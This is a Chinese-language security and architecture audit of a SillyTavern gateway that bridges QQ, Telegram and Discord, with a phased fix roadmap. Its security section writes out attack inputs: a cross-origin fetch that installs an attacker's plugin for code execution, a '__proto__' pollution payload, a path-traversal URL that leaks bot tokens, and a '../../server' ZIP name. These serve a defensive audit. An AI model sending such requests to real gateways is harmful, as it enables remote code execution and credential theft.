# SillyTavern Multi-Platform Gateway — 综合分析报告与优化建议

> 目标：把这个网关从"能用的桥接脚本"升级为**可独立运行的第二 SillyTavern 生态**——彻底解决「必须挂着浏览器前端才能聊天」以及「无法自由切换聊天存档 / 角色卡 / 世界书 / 预设」两大根本痛点，并系统性修复现有的可靠性与安全问题。
>
> 本报告基于对全仓库（前端扩展 `index.js`、后端 `server/**`、内置插件 `plugins/**`、文档）的逐文件审计。行号引用基于撰写时的工作区版本。
>
> 严重度标记：🔴 致命 / 🟠 高 / 🟡 中低。

---

## 第一部分 · 执行摘要

### 1.1 这个项目现在是什么

一个「SillyTavern 前端扩展 + 独立 Node 网关服务」的双体结构：

- **网关服务**（`server/`）：连接 QQ(OneBot v11) / Telegram / Discord，做消息收发、路由、会话缓存、插件执行，暴露一套 HTTP API。
- **ST 前端扩展**（`index.js` + `manifest.json`）：注入 SillyTavern 页面，**轮询**网关状态接口拿到入站消息，注入 ST 聊天框，触发 AI 生成，再把 AI 回复 POST 回网关发出去。

它已经实现了一个能跑通的最小闭环，并且在插件系统、多平台适配、连接重连上做了不少工程投入。但它距离「像 AstrBot 那样的生产级、自成生态」还有本质差距，差距不在功能数量，而在**架构定位**。

### 1.2 三句话结论

1. **当前"必须挂浏览器"不是 bug，是架构决定的**：ST 的 prompt 组装与 LLM 调用整体发生在浏览器前端 JS 里，网关只能寄生式地"隔着一层玻璃"轮询和注入。要根治，网关必须自己拥有一条推理管线。
2. **"无法自由切换存档/角色卡/世界书/预设"同样是架构决定的**：SillyTavern 全局只有一个"当前激活的聊天"，任何切换都是全局副作用。多个 IM 会话想各自绑定不同角色，在 ST 前端模型下无法真正做到——只有把"会话状态"搬进网关才能解。
3. **在补齐这两个根本能力之前，必须先堵住一批致命的可靠性与安全漏洞**：包括无鉴权 + CORS 全开 + 从 GitHub 装插件构成的 drive-by RCE 链、`deepMerge` 原型污染、路径穿越读取 Bot Token、重连链"静默死亡"、消息队列可全局死锁等。

### 1.3 优先级总览

| 阶段 | 目标 | 代表事项 |
|------|------|----------|
| **P0 · 止血** | 别让人被黑、别丢消息 | 全 API 鉴权、收敛 CORS、修路径穿越/原型污染、修重连死亡、队列超时 |
| **P1 · 加固闭环** | 把"挂浏览器"这条路走稳 | 轮询改推送 + ack、消息不再走日志通道、多会话并发正确、媒体抽象层 |
| **P2 · 自建生态** | 成为"第二 ST" | 网关自带推理管线，解析 ST 资产（卡/世界书/预设/存档），每会话独立 profile，脱离浏览器 |
| **P3 · 生态繁荣** | 可持续 | 插件签名与沙箱、WebUI、Docker、权限体系、可观测性 |

---

## 第二部分 · 两大根本命题的深度分析与解法

这是本报告的核心。其余所有 bug 修复都是为这两件事服务的地基。

### 2.1 命题 A：为什么"必须挂着浏览器前端"，以及如何摆脱

#### 2.1.1 根因

SillyTavern 本质是一个**浏览器端应用**：角色卡加载、世界书注入、预设/采样器组装、最终 prompt 拼接、调用 LLM API、流式接收——全部在前端 JavaScript 里完成。它没有一个"无头可调用的推理服务端"。

本网关的前端扩展因此只能这样工作（见 `index.js:505-632`）：

```
网关收到 IM 消息 → 存进 messageLog
   ↑                        ↓
ST 扩展每 3 秒轮询 /api/gateway/status 的 recentMessages
   → sendMessageAsUser() 把消息塞进 ST 聊天框
   → context.generate() 触发 AI
   → 监听 GENERATION_ENDED 抓取 chat 最后一条
   → POST /api/gateway/send 发回网关
```

也就是说，**浏览器页面是这条闭环里不可缺席的执行器**。关掉页面、页面卡死、切走标签导致定时器被节流，闭环就断。这不是可以靠"优化"绕过的，是 ST 的能力边界。

#### 2.1.2 三条出路（推荐走到路线三）

**路线一 · 短期加固（仍挂浏览器，但让它可靠）**
把"轮询消息日志"换成"服务端推送 + 待处理队列 + ack"，让前端只当一个"推理执行器"，消息传递不再依赖被截断的日志。适合快速止血，但没解决"必须开着页面"。

**路线二 · 无头浏览器托管（过渡方案）**
网关自己用 Puppeteer 拉起一个无头 SillyTavern 页面，把前端扩展那套逻辑跑在服务端托管的浏览器里。好处是复用 ST 全部能力、用户不用手动开窗；坏处是重（每实例一个 Chrome）、脆（ST 版本升级易崩）、难以多会话并发。项目里 `message-to-image` 插件已经引入了 `puppeteer-core`，技术栈是现成的。可作为"路线三"落地前的兼容层。

**路线三 · 网关自建推理管线（终局，真正的"第二生态"）** ⭐
让网关**不再依赖 ST 前端**，自己完成 prompt 组装与 LLM 调用。ST 退化成"资产编辑器"（你仍然用 ST 那套好用的 UI 去做卡、世界书、预设），网关成为"运行时"。

这条路一旦走通，命题 A 和命题 B **同时被解决**，因为会话状态和资产都在网关手里了。它需要网关具备下面这套"ST 资产运行时"，详见 2.3。

#### 2.1.3 推荐

以路线一止血、路线三为终局，路线二作为可选兼容层。不建议长期停留在路线一。

---

### 2.2 命题 B：为什么"无法自由切换存档/角色卡/世界书/预设"，以及如何解

#### 2.2.1 根因

SillyTavern 的数据模型是**单活动会话**：全局只有一个"当前角色 + 当前聊天 + 当前预设 + 当前世界书组合"。

- 现有的"角色路由"（`index.js:379-498` 的 `switchCharacter`）想按 IM 会话切换 ST 角色，但它做的是**切换全局 UI 状态**：
  - 用 `/loadchar`、`selectCharacterById`、`window.selectCharacterById` 三种"猜测式"调用（其中 `/loadchar` 并非 ST 标准命令），版本兼容性脆弱；
  - 切换会打断用户正在玩的会话；
  - 两个 IM 会话若绑定不同角色，会导致 ST **反复全局来回切**，而且所有消息都写进"当前打开的那个 ST 聊天"，**不同会话的聊天记录互相污染**。
- 更关键：这个功能**依赖一个叫 `st-data-manager` 的插件**（`index.js:360-366` 拉取它的 bindings），但**该插件在仓库里根本不存在**（`plugins/` 下只有 dice/hello/regex/option/msg2img 五个）。所以角色路由目前是**空中楼阁**。

> **后记（2026-08-03）**：上文的"插件不存在"记载已过时——`st-data-manager` 插件此后已实现并纳入仓库（`plugins/st-data-manager/`，包含角色卡/世界书管理、会话-角色绑定表及 4 个内置场景），ST 扩展侧（`index.js`）会轮询 `/api/plugins/st-data-manager/config` 拉取绑定表执行 `switchCharacter`。**但本节指出的设计局限依然成立**：ST 前端持有全局单会话状态，按 IM 会话切换角色仍是"全局来回切"，不同会话聊天记录互相污染的问题并未因插件落地而消除。完整的多会话隔离需走路线三（会话状态所有权迁移到网关，见下节）。

结论：在"ST 前端持有会话状态"的模型下，"自由切换 + 每会话独立"在数学上就无法同时成立——因为只有一个全局槽位。

#### 2.2.2 解法：把会话状态的所有权从 ST 搬到网关

只有当**每个 IM 会话在网关侧拥有自己完整、独立的运行上下文**时，"自由切换"和"互不干扰"才能并存。这正是路线三的核心。每个会话绑定一个 **Profile**：

```
Session(platform:chatId) → Profile {
    character:  角色卡引用(V2/V3),
    persona:    用户人格,
    preset:     预设(采样器 + prompt 顺序),
    worldbooks: [世界书引用...],
    chatArchive: 独立的聊天存档(.jsonl，与 ST 互通),
    llmBinding: 该会话用哪个模型/API key
}
```

切换存档 = 换 `chatArchive` 指针；切换角色 = 换 `character`；换世界书/预设同理。**每个会话各切各的，天然隔离，无全局副作用**。这就是 AstrBot 式"每个对话独立配置"的本质。

---

### 2.3 关键地基：网关侧的"ST 资产运行时"

要实现路线三，网关需要能**读懂并运行 ST 的数据资产**。好消息是这些格式都是公开、可解析的：

| 资产 | 格式 | 网关侧要做的事 |
|------|------|----------------|
| **角色卡** | PNG 内嵌 `tEXt`/`zTXt` chunk 里的 base64 JSON（Character Card V2/V3 规范），或纯 JSON | 解析出 `description/personality/scenario/first_mes/mes_example`、`character_book`、V3 的 `assets`。这些字段直接进 prompt。 |
| **世界书 / Lorebook** | JSON（`entries[]`，含 `keys`、`content`、`insertion_order`、`depth`、`selective`、`constant`、递归扫描等） | 实现关键词匹配 + 递归激活 + 按 `depth`/`order` 注入。这是 ST 最有价值也最复杂的部分，是"活的设定"。 |
| **预设 / Preset** | JSON（sampler 参数 + prompt 结构顺序，OpenAI/Claude 等各有格式） | 应用采样参数、按预设定义的顺序拼接 system/角色卡/世界书/历史/用户输入。 |
| **聊天存档** | `.jsonl`（每行一条消息对象） | 直接读写，**与 ST 完全互通**——用户可以在 ST 里继续同一个存档，也可以从 IM 继续。这是"自由切换存档"的物理基础。 |
| **用户人格 Persona** | JSON | 注入为 user 侧设定。 |

有了这层运行时，网关就能：直连 OpenAI 兼容 / Claude / Gemini API → 自己组 prompt → 自己调用 → 自己流式返回，**完全不需要浏览器**。ST 只用来"编辑资产"，网关负责"运行资产"。

> 实现建议：这层可以作为网关的一个核心模块 `server/runtime/`（`card-loader` / `worldbook-engine` / `preset-engine` / `prompt-builder` / `llm-client`），并把"用哪条推理管线"做成可切换：`st-frontend`(路线一) / `st-headless`(路线二) / `native`(路线三)，让用户平滑迁移。

---

## 第三部分 · 现有实现的系统性问题（按主题）

> 下面是"在走向第二生态之前必须处理"的具体缺陷清单。每条都带位置，便于直接开工。

### 3.1 消息传输通道：把"日志"当"可靠传输"用 🔴

这是当前闭环最脆弱的地方，且很隐蔽。

- 前端注入 ST 的消息，来源是 `/api/gateway/status` 返回的 `recentMessages`（`gateway-core.js:391`），而它是**观测用的消息日志**，不是传输队列：
  - `content` 被 **截断到 100 字符**（`gateway-core.js:449`）→ 超过 100 字的 IM 长消息注入 ST 时**被截断**，AI 只看到半句话。
  - 只保留**最近 20 条**（`slice(-20)`）→ 3 秒轮询间隔内若来了超过 20 条消息，**多出来的直接丢**。
  - 没有 ack、没有游标、没有"已消费"标记，全靠前端 `processedMessageIds` Set 去重，而这个 Set **页面刷新即清空**、且**无上限增长**（内存泄漏）。
- **建议**：入站消息进一条**独立的待处理队列**（带持久化 + 每条唯一 ID + ack）。前端（或未来的 native 管线）用 SSE/WebSocket 订阅，处理完回 ack，网关才出队。彻底与 `messageLog`（观测）分离。

### 3.2 AI 回复闭环：多会话并发竞态 🔴

- `pendingReplyTarget` 是**单个全局变量**（`index.js:293`），`isProcessing` 是**单个布尔锁**。多个 IM 会话同时来消息时：
  - `processIncomingMessages` 在循环里逐条 `await context.generate()`，但 `pendingReplyTarget` 会被后一条覆盖，回复可能发错会话。
  - `GENERATION_ENDED` 里取 `context.chat` 的**最后一条**当作回复（`index.js:602`）——如果用户此时正自己在 ST 里手动聊天，会**把用户自己的对话误转发**到 IM。
- **建议**：用 `Map<generationId, target>` 关联每次生成与其目标；或在 native 管线里每会话独立上下文，从根上消除竞态。

### 3.3 群聊语义丢失 🟠

- 注入格式是 `[🐧 qq] 消息内容`（`index.js:568`），**丢掉了 senderName**。群里多个用户发言，AI 眼里全是"同一个人"，无法区分谁说了什么。
- 会话 key 是 `platform:chatId`（`session-manager.js`），**一个群所有成员共享同一段历史**，多人角色扮演上下文会混乱；没有"每用户独立 / 群共享"的可配置策略。
- **建议**：注入时带上发送者名与稳定的用户标识；会话模型支持"群内按用户分线程"选项。

### 3.4 连接可靠性：重连会"静默死亡" 🔴

- **Telegram / Discord 的 `connect()` 失败路径只 `setState(ERROR)` 然后 throw**（`telegram-adapter.js:65-69`、`discord-adapter.js:51-55`），从不调用 `handleDisconnect`。而 `reconnect.js:65-71` 只 catch 回调异常、**不会自动续接下一次重连**。结果：**首次重连失败后，重连彻底停止，适配器永久卡在 ERROR，面板却不一定显示异常**。
- **OneBot 反向模式重连必然失败**：客户端断开 → 重连 → `new WebSocket.Server({ port })`，而旧 server 还占着端口 → `EADDRINUSE` → 永久死亡（`onebot-adapter.js:110-158`）。反向模式本就不该在客户端断开时"重连"，只需继续监听等待连入。
- **重连定时器覆盖导致并发重连**：`reconnect.js:65` 调度前不 `cancel()` 旧 timer；ws 的 `error`+`close` 成对触发会产生两个并发 `connect()` → 重复连接、消息重复。
- Telegram 连接失败泄漏轮询实例 → 多个 getUpdates → **409 Conflict + 消息重复**（`telegram-adapter.js:33-69`，catch 里未 `stopPolling`）。
- Discord `connect()` 在 `ClientReady` 之前就 resolve，若 ready 永不到来（intent 没开、token 失效）**无超时兜底**，永久卡 CONNECTING。
- **建议**：重连语义收进 `reconnect.js` 自身（回调 reject 就自动再调度）；每个 `connect()` 失败都走统一的 `handleDisconnect`；加"连接稳定 ≥N 秒才 reset 退避"避免 flapping 热循环；反向模式引入 `LISTENING` 状态。

### 3.5 消息队列：可全局死锁 + 乱序 🔴

- `message-queue.js:121` 的 `sendHandler` **无超时**，而 `processing` 是全局互斥锁。任一次发送挂起（Discord `channels.fetch`/Telegram HTTP 无超时）→ **所有平台所有消息全部停摆**，无告警。
- 失败重试把消息 **推到队尾**（`message-queue.js:132`）→ 同一会话 AI 回复第 1 段重试时第 2 段已发出 → **用户看到颠倒的对话**。
- 队列满时 `shift()` 丢队头（恰恰是高优先级），且 `enqueue` 永远返回 true（**丢了也不告诉调用方**，HTTP 仍回 200）。
- 最终失败**没有任何出口**：无死信队列、无回调、不通知用户，消息内容也没进日志，无法人工补发。
- **建议**：`Promise.race` 加发送超时；per-chat 顺序保证（同会话串行、跨会话并行）；死信队列 + 失败事件；背压反馈给上游。

### 3.6 媒体链路整体是断的 🟠

`InboundMessage.mediaUrls` 是**扁平字符串数组，丢失了媒体类型**，且各平台实现残缺：

| | 入站图片 | 入站语音 | 入站视频/文件 | 出站 |
|---|---|---|---|---|
| QQ | 采集 URL，但 CQ 码 `&#44;` 未反解码可能损坏 URL | 只留 `[语音]` 占位，**无 STT** | file 段丢失 | 一律当图片，语音/文件无法出站 |
| Telegram | `tg://photo/<file_id>` **伪 URL，全项目无人 `getFileLink` 解析**；**caption 被丢弃**（带图带字消息文字全丢，@bot 的图片消息被直接丢弃） | 伪 URL + `[语音]`，无 STT | **完全不进 mediaUrls** | `sendPhoto(tg://...)` 必失败 |
| Discord | 仅 `image/*` 附件；`contentType` 为 null 时漏采 | 语音是 audio 附件，**被过滤掉** | 丢弃 | `files:[{attachment:url}]` 存在 **SSRF**（见 3.7） |

- **根本问题**：没有统一媒体抽象、没有"下载→缓存→再上传"模块。QQ 的时效 URL、Telegram 的 file_id 都无法被其他平台消费，跨平台转发媒体必然失败；语音全平台无 STT、图片无 vision 传递，**多模态能力为零**。
- **建议**：`MediaAsset { type, mimeType, url|fileId|localPath, size, duration }` 抽象 + 网关侧媒体缓存服务（拉取时效 URL 落本地，统一以 http 提供给出站），并在 native 管线里接 STT / vision。

### 3.7 消息段解析质量（会导致 QQ 端乱码）🟠

- **OneBot 数组消息段做了多余的 CQ 转义**（`onebot-v11.js:150`）→ AI 回复里的 `[` `]` `&` 在 QQ 端显示成 `&#91;` `&#93;` `&amp;`，Markdown 链接、代码块、`[思考]` 标记全乱码。修复即删掉那次 `escapeCQ`。
- **`unescapeCQ` 漏了逗号 `&#44;`**（`onebot-v11.js:279`）→ 含逗号的图片 URL/文件名残留 `&#44;` → 图片下载失效。
- OneBot `mentioned` 语义错误：@任何人都算 `mentioned=true`（`onebot-v11.js:91`），且 `onebot-adapter.js:401` 用了这个错误值而非自己正确的 `_isMentioned()`。
- Telegram 只认 `entity.type==='mention'`，漏 `text_mention` / `caption_entities`；富文本（bold/link）完全不解析。
- Discord 只剥 `<@id>`，漏 `<@&role>` / `<#channel>` / 自定义 emoji / `@everyone`；被 @身份组时 bot 不响应。
- **长消息不分段**：OneBot `send()` 完全没调 `splitMessage`（`onebot-adapter.js:268`），QQ 长回复超 4500 字节直接被拒 → 队列重试 3 次全败，用户啥也收不到。

### 3.8 安全：这是目前最需要严肃对待的部分 🔴

网关默认绑 `127.0.0.1`，但**这挡不住用户浏览器上的恶意网页**，因为 CORS 全开且无鉴权。

**攻击链一 · Drive-by RCE（浏览器驱动的远程代码执行）**
`server/index.js:27-34` 对所有路由设 `Access-Control-Allow-Origin: *`，且整套 `/api/*` **零鉴权**。用户访问任意恶意网页时，页面里一段 `fetch('http://127.0.0.1:3210/api/plugins/install/github', {POST, body:{url:'attacker/evil'}})` 就能：下载攻击者仓库 → 解压 → `import()` **在用户机器上执行任意代码**。插件零沙箱、零签名、`plugin.json` 的 `permissions` 字段**全项目从未被读取**。

**攻击链二 · 原型污染（可远程触发）**
`config.js:157-172` 的 `deepMerge` 会处理 `JSON.parse` 带来的 `__proto__` 键，配合**无鉴权的** `POST /api/gateway/config`（`index.js:124`），攻击者 POST `{"__proto__":{...}}` 即可污染全局 `Object.prototype`。

**攻击链三 · 路径穿越读 Bot Token**
`plugin-manager.js:315/330` 的 `path.join(dataDir, \`${name}.json\`)`，`name` 直取 `req.params.name`，用 `%2F` 编码可穿越：`GET /api/plugins/..%2F..%2Fconfig%2Fgateway/config` → 读到 `config/gateway.json` → **QQ/Telegram/Discord 全部 Bot Token 明文泄露**（`GET /api/gateway/config` 本身也无鉴权、明文返回）。写侧可覆盖任意 `.json`。

**攻击链四 · 安装包目录穿越**
`plugin-manager.js:585` 的 `path.join(pluginsDir, meta.name)`，`meta.name` 来自不可信 ZIP。`{"name":"../../server"}` → `fs.rmSync(server, {recursive})` **删除整个 server 目录** + `cpSync` **覆盖核心文件**，下次启动即以攻击者代码运行。

**其它高危**
- Discord 斜杠命令路径**完全绕过白名单**（`discord-adapter.js:100-128` 无 allowedUsers 检查）。
- Discord `files:[{attachment:url}]` 让 discord.js 服务端请求任意 URL → **SSRF**（可探测 `169.254.169.254`、`127.0.0.1:3210/api/gateway/config`）。
- message-to-image `--no-sandbox` + 用户可写 `baseHtml`/`baseCss`/`executablePath`（无鉴权配置 API）→ 关沙箱的 Chrome 执行任意脚本 / 启动任意二进制。
- OneBot 反向 WS 默认绑 `0.0.0.0` + 空 token = **不鉴权**（`onebot-adapter.js:115`）；Token 明文存 `config/gateway.json`（默认 0644 权限）。
- **命令系统零权限模型**：QQ 群任意成员可 `/regex import`（注入 ReDoS 正则打满 CPU）、`/regex fallback off`（静默 DoS）、`/msg2img export-log`（服务器写文件 + 绝对路径回显群里）。
- 用户可控正则（regex-filter / option-splitter）→ **ReDoS**，对每条出站消息执行，无超时；option-splitter 的**零长匹配死循环**（`option-splitter/index.js:182`，用户填 `^.*$` 即卡死整个进程）。
- 日志**无任何脱敏**：Telegram 错误 message 可能含 `bot<TOKEN>` URL、Discord debug 含 token 片段、用户聊天原文明文落盘。

### 3.9 数据持久化：内存为主，易丢易泄 🟠

- **会话 Map 无 TTL、无淘汰、无上限**（`session-manager.js:18`）= 明确内存泄漏；`lastActiveAt` 记了但从没被清理逻辑用过。长期运行的公开 bot 内存持续增长。
- 配置/会话文件**非原子写**（直接 `writeFileSync`）：写到一半崩溃 → 文件截断 → `load()` catch 后**静默清空** → 下个周期又把空数据覆写回去 → **用户所有 token / 历史永久丢失且无备份**。
- 会话全量对话**明文落盘**（`data/sessions.json`，0644），含用户 ID、昵称、完整聊天内容，对角色扮演场景属高敏感数据，无加密无脱敏无保留期。
- 30 秒**同步全量序列化**（`session-manager.js:215`），1000 会话时数百毫秒事件循环停顿，可能连带触发 WS 心跳超时断连。
- **建议**：tmp+rename 原子写、解析失败保留 `.corrupt` 备份并禁止自动覆盖、TTL/LRU 淘汰、迁到 SQLite。

### 3.10 插件系统：热插拔承诺没兑现 🟠

- **禁用插件无效**：`disablePlugin` 不调 `onUnload` 也不碰 `outboundFilters`（`plugin-manager.js:193`），而 regex/option/msg2img 的功能 100% 在 outboundFilter 上 → **"禁用正则过滤器"后它仍在过滤每条回复，"禁用转图片"后 Chrome 仍在跑**。
- **禁用状态不持久化**（`pluginStates` 只在内存）→ 重启后被关掉的插件全部复活。
- **卸载不删文件** → 重启复活；`enablePlugin` 非幂等 → 重复启用监听器叠加多次执行。
- **热重载半残**：`?t=Date.now()` 只对入口文件破缓存，子模块（如 `renderer.js`）仍跑旧代码（`plugin-loader.js:96`）；且每次重载永久泄漏一份 ESM 模块；重载失败插件直接"消失"需重启。
- **schema 的 `default` 从不被应用**，每个插件被迫手写 `_ensureDefaults`（三种写法），文档还把这个 workaround 固化成"标准做法"。
- **`static schedules` / cron 完全未实现**：SDK 有声明、文档列为核心能力、`getPluginInfo` 还展示它，但**没有任何调度器**——插件作者写了 schedules 会发现永不执行且无警告。
- `plugin-context.js:174-187` 的 `getPluginConfig`/`setPluginConfig` 是**彻底损坏的死 API**（构造函数从没接线，永远返回 `{}` / 永远静默丢弃）。
- `reply()` 无条件置 `handled=true` → **任何监听器回复过一次，这条消息就永远到不了 ST、不进历史**（`plugin-context.js:89` + `index.js:70`），文档完全没提这个副作用。
- **建议**：框架代管所有注册（过滤器/定时器/监听器统一走 SDK 受管 API，卸载自动回收）；load-then-swap 重载；持久化插件状态；实现或删除 cron 与 permissions；schema default 在实例化前注入。

### 3.11 内置插件的代表性缺陷（举证）

- **regex-filter**：`/regex test-full` 把移除规则作用在**原文**而非提取后文本（`index.js:463`），测试结果与线上不一致；带 `g` flag 时提取取错捕获组；`trimStrings` 空串曾可致死循环（有脆弱防护）。
- **option-splitter**：在纯函数 `filterOutbound` 里做 fire-and-forget 异步发送（`index.js:108`），正文可能发不出去但选项已飞、长正文时选项先于正文送达；`stripPrefix` 行为与文档相反。
- **message-to-image**：缓存因含 `{{time}}` **100% miss** 仍堆文件；`String.replace` 的 `$` 模式注入（`renderer.js:300`）使含 `$&` 的回复错乱；截图 clip 硬编码假设元素在左上角；`file:///` 媒体 URL **只对 QQ/NapCat 同机有效**，Telegram/Discord 收不到，但 `applyToPlatforms` 暗示三平台都支持；默认字体 `Microsoft YaHei` 在 Linux 容器里掉豆腐块。

### 3.12 工程基建缺口 🟡

- **零测试、零 CI、零 lint**（`test-loader.js` 是手工脚本），所有版本号都是 `1.0.0`。
- 前端两套 UI 并存（`settings.html` 旧面板 + `panel.html` 顶级面板），配置字段不一致。
- `node-telegram-bot-api` 老旧（回调式），建议迁 grammY/telegraf；`uuid` 可换 `crypto.randomUUID`。
- 日志无 `logs/` 目录创建（`logger.js:6` 未 mkdir）、丢弃结构化元数据、无 requestId 贯穿、无 `unhandledRejection` 兜底。
- README / PROJECT_HANDOFF 与代码已有漂移。
- 前端 `startGatewayServer` 依赖浏览器 `require('child_process')`（仅 Electron 可用，纯浏览器场景全失效）。

---

## 第四部分 · 分阶段实施路线图

### 阶段 P0 · 安全与可靠性止血（先做，且必须做完再谈生态）

1. 全 `/api/*` 加本地鉴权 token；`Access-Control-Allow-Origin: *` 收敛为 SillyTavern 具体 Origin；写操作校验 `Origin`/`Sec-Fetch-Site`。
2. 修 `deepMerge` 原型污染（跳过 `__proto__`/`constructor`/`prototype`）。
3. 净化所有 `path.join` 的用户输入（`req.params.name`、`meta.name`、`subfolder`）：统一 `^[a-z0-9][a-z0-9._-]{0,63}$` + `resolve` 前缀断言。
4. GitHub 安装改为按 tag/commit SHA + 校验和 + 安装前人工确认；市场结果标"未审核"；纯 JS 解压 + zip-slip/大小上限；下载加超时与 `Content-Length` 上限。
5. `GET /api/gateway/config` 返回脱敏配置（token 打码）；token 落盘 `mode:0o600`；日志层做 token/手机号/长 ID 打码。
6. 修重连"静默死亡"（重连语义收进 `reconnect.js`，每个 connect 失败走 handleDisconnect，加连接稳定判定）；反向模式引入 LISTENING 状态。
7. 消息队列加发送超时 + per-chat 顺序 + 死信队列。
8. 配置/会话原子写 + 损坏备份；会话 Map 加 TTL/LRU。
9. 命令系统引入 `adminOnly` + 用户白名单；正则执行加超时/复杂度限制；修 option-splitter 零长匹配死循环。

### 阶段 P1 · 加固闭环（把路线一走稳）

10. 入站消息独立队列（唯一 ID + 持久化 + ack），前端改 SSE/WebSocket 订阅，**不再走 messageLog**；解决截断/丢失。
11. 多会话并发正确性：`Map<generationId, target>`；注入带 senderName；会话支持"群内按用户分线程"。
12. 统一媒体抽象 `MediaAsset` + 媒体缓存服务（下载时效 URL 落本地统一 http 提供）；修 CQ 转义/逗号解码；OneBot 出站 `splitMessage`。
13. 禁用插件真正 `onUnload`；框架代管注册与回收；持久化插件状态；schema default 注入；实现或删除 cron/permissions。

### 阶段 P2 · 自建推理管线（成为"第二 ST"）

14. `server/runtime/`：角色卡(V2/V3 PNG chunk)解析、世界书引擎(关键词/递归/depth/order)、预设引擎(sampler+prompt 顺序)、prompt builder、LLM client(OpenAI 兼容/Claude/Gemini 流式)。
15. 会话 Profile 模型：每 IM 会话绑定 `{character, persona, preset, worldbooks, chatArchive, llmBinding}`，聊天存档 `.jsonl` 与 ST 互通。
16. 命令化的"自由切换"：`/char`、`/preset`、`/world`、`/load <存档>`、`/new`，各会话独立、无全局副作用。
17. 推理管线可切换：`st-frontend`(路线一) / `st-headless`(路线二，复用已有 puppeteer-core) / `native`(路线三)，平滑迁移。

### 阶段 P3 · 生态繁荣

18. 独立 WebUI（脱离 ST 面板做配置/会话/插件管理）+ Docker 镜像 + 进程守护 + 配置热更新。
19. 插件签名与沙箱（worker/vm 隔离 + capability 收窄 + `permissions` 落地）；插件脚手架 CLI；i18n。
20. 多模态：STT（语音转写）、vision（图片理解）接入 native 管线；多 LLM 直连与角色路由。
21. 可观测性：requestId 贯穿、每插件指标、健康检查区分"已加载/工作正常"、审计日志。
22. 工程基建：单元测试 + CI + ESLint + 语义化版本 + `engines` 字段。

---

## 第五部分 · 与 AstrBot 式生态的差距速览

| 维度 | 现状 | 目标（第二生态） |
|------|------|------------------|
| 运行依赖 | 必须挂浏览器 ST 前端 | 网关自带推理管线，可无头运行 |
| 会话状态所有权 | 在 ST（全局单活动） | 在网关（每会话独立 Profile） |
| 切换卡/世界书/预设/存档 | 全局副作用，且依赖不存在的插件 | 每会话命令级切换，天然隔离 |
| 部署 | 手动 npm start + 挂链接目录 | Docker + WebUI + 守护进程 |
| 安全 | 无鉴权 + drive-by RCE + 明文 token | 鉴权 + 沙箱 + 签名 + 脱敏 |
| 插件 | 热插拔半残、禁用无效、无沙箱 | 受管生命周期 + 沙箱 + 签名市场 |
| 多模态 | 占位符，能力为零 | STT + vision + 媒体缓存 |
| 可靠性 | 重连会死、队列会锁、消息会丢 | 自愈重连 + 有序队列 + ack |
| 工程 | 零测试零 CI | 测试 + CI + 语义化版本 |

---

## 附 · 一页纸行动清单（如果只做最重要的 10 件事）

1. 🔴 全 API 鉴权 + 收敛 CORS（堵住 drive-by RCE / token 泄露）。
2. 🔴 修 `deepMerge` 原型污染 + 所有路径穿越点。
3. 🔴 GitHub 插件安装：SHA 锁定 + 校验 + 人工确认 + 纯 JS 安全解压。
4. 🔴 修重连"静默死亡"与反向模式 EADDRINUSE。
5. 🔴 消息队列发送超时 + per-chat 有序 + 死信队列。
6. 🟠 入站消息独立队列 + ack，前端改推送，彻底告别"日志当传输"（修截断/丢消息）。
7. 🟠 多会话并发正确性 + 注入带 senderName（修错发/群聊混淆）。
8. 🟠 统一媒体抽象 + 缓存服务（让跨平台媒体与多模态成为可能）。
9. 🟠 禁用插件真正生效 + 框架代管注册回收 + 持久化状态。
10. ⭐ 启动 `server/runtime/` 自建推理管线 —— 这是"第二生态"和两大根本痛点的**唯一真正解法**。

---

*报告版本 v1.0 · 基于全仓库逐文件审计 · 2026-07-26*
